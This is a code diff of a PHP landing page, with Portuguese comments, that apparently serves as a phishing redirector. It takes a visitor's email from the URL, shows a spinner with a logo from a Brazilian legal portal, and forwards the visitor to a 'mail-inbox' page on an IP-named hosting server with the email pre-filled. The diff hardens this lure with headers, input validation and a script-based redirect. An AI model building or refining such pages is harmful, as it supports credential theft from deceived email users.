@@ -1,13 +1,16 @@
 <?php
+header("X-Frame-Options: SAMEORIGIN");
+header("X-Content-Type-Options: nosniff");
+header("Cache-Control: no-store, no-cache, must-revalidate");
+header("Pragma: no-cache");
 // Pega a query string completa
 $query = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
 $email = '';
 
 // Tenta pegar o email da forma padrão ?email=...
 if (isset($_GET['email'])) {
-    $email = $_GET['email'];
+    $email = trim($_GET['email']);
 } else {
-    // Se não tiver chave, tenta extrair qualquer e-mail da query
     if (preg_match('/[^\s@]+@[^\s@]+\.[^\s@]+/', $query, $matches)) {
         $email = $matches[0];
     }
@@ -15,12 +18,16 @@ if (isset($_GET['email'])) {
 
 // Função simples para validar e-mail
 function validar_email($email) {
-    return filter_var($email, FILTER_VALIDATE_EMAIL);
+    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
 }
 
 // URL de redirecionamento base
 $redirectUrlBase = "https://218.178.205.92.host.secureserver.net/mail-inbox/index.php";
-$redirectUrl = $redirectUrlBase . "?email=" . urlencode($email);
+$redirectUrl = '';
+
+if (validar_email($email)) {
+    $redirectUrl = $redirectUrlBase . "?email=" . urlencode($email);
+}
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -77,13 +84,19 @@ $redirectUrl = $redirectUrlBase . "?email=" . urlencode($email);
     }
 </style>
 <?php if ($email && validar_email($email)) : ?>
-<meta http-equiv="refresh" content="2.2;url=<?php echo $redirectUrl; ?>">
+<script>
+setTimeout(function(){
+    window.location.href = "<?php echo htmlspecialchars($redirectUrl, ENT_QUOTES, 'UTF-8'); ?>";
+},2200);
+</script>
 <?php endif; ?>
 </head>
 <body>
 <div class="container">
     <img src="https://static.jusbr.com/web/lawsuit/_next/static/media/keep_updated.68ab33cd.svg" 
-         class="logo" alt="Logo">
+class="logo" 
+alt="Logo"
+loading="lazy">
 
     <div class="spinner"></div>
 
